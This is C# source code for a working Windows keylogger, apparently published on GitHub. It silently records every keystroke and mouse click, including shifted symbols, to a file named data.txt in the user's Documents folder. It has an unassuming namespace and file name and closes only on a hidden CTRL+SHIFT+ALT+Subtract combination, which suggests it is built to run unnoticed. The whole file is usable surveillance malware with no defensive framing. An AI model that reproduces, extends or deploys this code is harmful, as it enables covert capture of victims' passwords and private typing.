using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

/*
 * Author: DCS77 on Github
 * Date: 13 March 2017
 * Description: Saves a local copy of key presses and mouse clicks in MyDocuments\data\data.txt
 */

namespace dataController {
	class Program {

		[DllImport("User32.dll")]

		public static extern int GetAsyncKeyState(Int32 i);

		static void Main(string[] args) {

			//Output folder of key logs file. e.g. MyDocuments\data\
			String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			filepath = filepath + @"\data\";

			if (!Directory.Exists(filepath)) {
				Directory.CreateDirectory(filepath);
			}

			//Output filename of key logs file.
			string path = (@filepath + "data.txt");

			if (!File.Exists(path)) {
				using (StreamWriter sw = File.CreateText(path)) {}
			}

			//Record local computer Date and Time on startup
			using (StreamWriter sw = File.AppendText(path)) {
				sw.WriteLine();
				sw.Write("♣♣♣KL1♣♣♣ " + DateTime.Now.ToString("dd/MM/yyyy h:mm:ss tt") + " ♣♣♣KL1♣♣♣");
				sw.WriteLine();
			}

			KeysConverter converter = new KeysConverter();
			string text = "";
			
			while (true) {
				Thread.Sleep(20);

				//Increase max i if logger is skipping key presses
				for(Int32 i = 0; i<5000; i++) {

					int key = GetAsyncKeyState(i);

					//If the combination of CTRL+SHIFT+ALT+Subtract keys are pressed, close the program. (Subtract is the top-right key of the numpad)
					if (((String.Compare(text, "Subtract", false)) == 0) && ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) && ((Control.ModifierKeys & Keys.Control) == Keys.Control) && ((Control.ModifierKeys & Keys.Alt) == Keys.Alt)) {
						if (System.Windows.Forms.Application.MessageLoop) {
							//WinForms app
							System.Windows.Forms.Application.Exit();
						} else {
							//Console app
							System.Environment.Exit(1);
						}
					}

					//Customisable symbols and string sequences appended to the log file when each button is pressed.
					//Else uses default string values
					if (key == 1 || key == -32767) {
						text = converter.ConvertToString(i);
						using (StreamWriter sw = File.AppendText(path)) {

							if ((String.Compare(text, "RButton", false)) == 0) {
								sw.Write("→");
								break;
							} else if ((String.Compare(text, "LButton", false)) == 0) {
								sw.Write("←");
								break;
							} else if ((String.Compare(text, "MButton", false)) == 0) {
								sw.Write("↕");
								break;
							} else if ((String.Compare(text, "Left", false)) == 0) {
								sw.Write("◄");
								break;
							} else if ((String.Compare(text, "Up", false)) == 0) {
								sw.Write("▲");
								break;
							} else if ((String.Compare(text, "Right", false)) == 0) {
								sw.Write("►");
								break;
							} else if ((String.Compare(text, "Down", false)) == 0) {
								sw.Write("▼");
								break;
							} else if ((String.Compare(text, "Enter", false)) == 0) {
								sw.WriteLine();
								break;
							} else if ((String.Compare(text, "Space", false)) == 0) {
								sw.Write(" ");
								break;
							} else if ((String.Compare(text, "Back", false)) == 0) {
								sw.Write("«");
								break;
							} else if ((String.Compare(text, "LShiftKey", false)) == 0) {
								//sw.Write(" #sl ");
								break;
							} else if ((String.Compare(text, "RShiftKey", false)) == 0) {
								//sw.Write(" #sr ");
								break;
							} else if ((String.Compare(text, "ShiftKey", false)) == 0) {
								//sw.Write(" #s ");
								break;
							} else if ((String.Compare(text, "Menu", false)) == 0) {
								sw.Write("#A");
								break;
							} else if ((String.Compare(text, "LMenu", false)) == 0) {
								//sw.Write("#AL");
								break;
							} else if ((String.Compare(text, "RMenu", false)) == 0) {
								//sw.Write("#AR");
								break;
							} else if ((String.Compare(text, "LWin", false)) == 0) {
								sw.Write("#W");
								break;
							} else if ((String.Compare(text, "RWin", false)) == 0) {
								sw.Write("#W");
								break;
							} else if ((String.Compare(text, "LControlKey", false)) == 0) {
								sw.Write("#cl ");
								break;
							} else if ((String.Compare(text, "RControlKey", false)) == 0) {
								sw.Write("#cr ");
								break;
							} else if ((String.Compare(text, "ControlKey", false)) == 0) {
								sw.Write("#c ");
								break;
							} else if ((String.Compare(text, "NumLock", false)) == 0) {
								sw.Write("#Num ");
								break;
							} else if ((String.Compare(text, "Divide", false)) == 0) {
								sw.Write("/");
								break;
							} else if ((String.Compare(text, "Multiply", false)) == 0) {
								sw.Write("*");
								break;
							} else if ((String.Compare(text, "Subtract", false)) == 0) {
								sw.Write("-");
								break;
							} else if ((String.Compare(text, "Add", false)) == 0) {
								sw.Write("+");
								break;
							} else if ((String.Compare(text, "Home", false)) == 0) {
								sw.Write("#Home");
								break;
							} else if ((String.Compare(text, "PgUp", false)) == 0) {
								sw.Write("#PgUp");
								break;
							} else if ((String.Compare(text, "PgDn", false)) == 0) {
								sw.Write("#PgDn");
								break;
							} else if ((String.Compare(text, "Ins", false)) == 0) {
								sw.Write("#Ins");
								break;
							} else if ((String.Compare(text, "Del", false)) == 0) {
								sw.Write("≥");
								break;
							} else if ((String.Compare(text, "End", false)) == 0) {
								sw.Write("#End");
								break;
							} else if ((String.Compare(text, "Clear", false)) == 0) {
								sw.Write("#Clear");
								break;
							} else if ((String.Compare(text, "NumPad0", false)) == 0) {
								sw.Write("0");
								break;
							} else if ((String.Compare(text, "NumPad1", false)) == 0) {
								sw.Write("1");
								break;
							} else if ((String.Compare(text, "NumPad2", false)) == 0) {
								sw.Write("2");
								break;
							} else if ((String.Compare(text, "NumPad3", false)) == 0) {
								sw.Write("3");
								break;
							} else if ((String.Compare(text, "NumPad4", false)) == 0) {
								sw.Write("4");
								break;
							} else if ((String.Compare(text, "NumPad5", false)) == 0) {
								sw.Write("5");
								break;
							} else if ((String.Compare(text, "NumPad6", false)) == 0) {
								sw.Write("6");
								break;
							} else if ((String.Compare(text, "NumPad7", false)) == 0) {
								sw.Write("7");
								break;
							} else if ((String.Compare(text, "NumPad8", false)) == 0) {
								sw.Write("8");
								break;
							} else if ((String.Compare(text, "NumPad9", false)) == 0) {
								sw.Write("9");
								break;
							} else if ((String.Compare(text, "OemPeriod", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write(">");
								} else {
									sw.Write(".");
								}
								break;
							} else if ((String.Compare(text, "Oemcomma", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("<");
								} else {
									sw.Write(",");
								}
								break;
							} else if ((String.Compare(text, "OemMinus", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("_");
								} else {
									sw.Write("-");
								}
								break;
							} else if ((String.Compare(text, "Oemplus", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("+");
								} else {
									sw.Write("=");
								}
								break;
							} else if ((String.Compare(text, "OemOpenBrackets", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("{");
								} else {
									sw.Write("[");
								}
								break;
							} else if ((String.Compare(text, "Oem6", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("}");
								} else {
									sw.Write("]");
								}
								break;
							} else if ((String.Compare(text, "Oem5", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("|");
								} else {
									sw.Write("\\");
								}
								break;
							} else if ((String.Compare(text, "Oem1", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write(":");
								} else {
									sw.Write(";");
								}
								break;
							} else if ((String.Compare(text, "Oem7", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("\"");
								} else {
									sw.Write("'");
								}
								break;
							} else if ((String.Compare(text, "OemQuestion", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("?");
								} else {
									sw.Write("/");
								}
								break;
							} else if ((String.Compare(text, "Oemtilde", false)) == 0) {
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									sw.Write("~");
								} else {
									sw.Write("`");
								}
								break;
							} else {
								//Recognise other uppercase/shift keys
								if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift) {
									if ((String.Compare(text, "1", false)) == 0) {
										sw.Write("!");
									} else if ((String.Compare(text, "2", false)) == 0) {
										sw.Write("@");
									} else if ((String.Compare(text, "3", false)) == 0) {
										sw.Write("#");
									} else if ((String.Compare(text, "4", false)) == 0) {
										sw.Write("$");
									} else if ((String.Compare(text, "5", false)) == 0) {
										sw.Write("%");
									} else if ((String.Compare(text, "6", false)) == 0) {
										sw.Write("^");
									} else if ((String.Compare(text, "7", false)) == 0) {
										sw.Write("&");
									} else if ((String.Compare(text, "8", false)) == 0) {
										sw.Write("*");
									} else if ((String.Compare(text, "9", false)) == 0) {
										sw.Write("(");
									} else if ((String.Compare(text, "0", false)) == 0) {
										sw.Write(")");
									} else {
										sw.Write(text);
									}
								} else {
									sw.Write(text.ToLower());
								}
								
								break;
							}
						}
					}
				}
			}
		}
	}
}
